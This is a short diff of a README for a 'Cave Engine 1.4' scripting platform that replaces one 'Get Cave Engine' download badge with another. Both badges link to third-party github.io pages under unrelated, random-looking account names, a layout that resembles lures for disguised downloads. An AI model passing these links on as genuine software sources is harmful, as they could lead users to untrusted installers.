@@ -21,7 +21,7 @@ To begin using this **Cave Engine 1.4 Scripting** platform and **Cave Engine 1.4
 | :--- | :--- |
 | **Get Cave Engine 1.4** | Click the button below to initiate the setup for this **Cave Engine 1.4 Game Development** environment. |
 
-[![Button](https://img.shields.io/badge/📦-Get_Cave_Engine_1.4-2ea44f?style=for-the-badge)](https://theissadunchasonera.github.io/.github/cave-engine-1-4-game-development)
+[![Cave Engine](https://img.shields.io/badge/Cave-Engine-9333EA?style=for-the-badge)](https://cave-engine-studio.github.io/.github/cave-engine)
 
 ## System Requirements
 
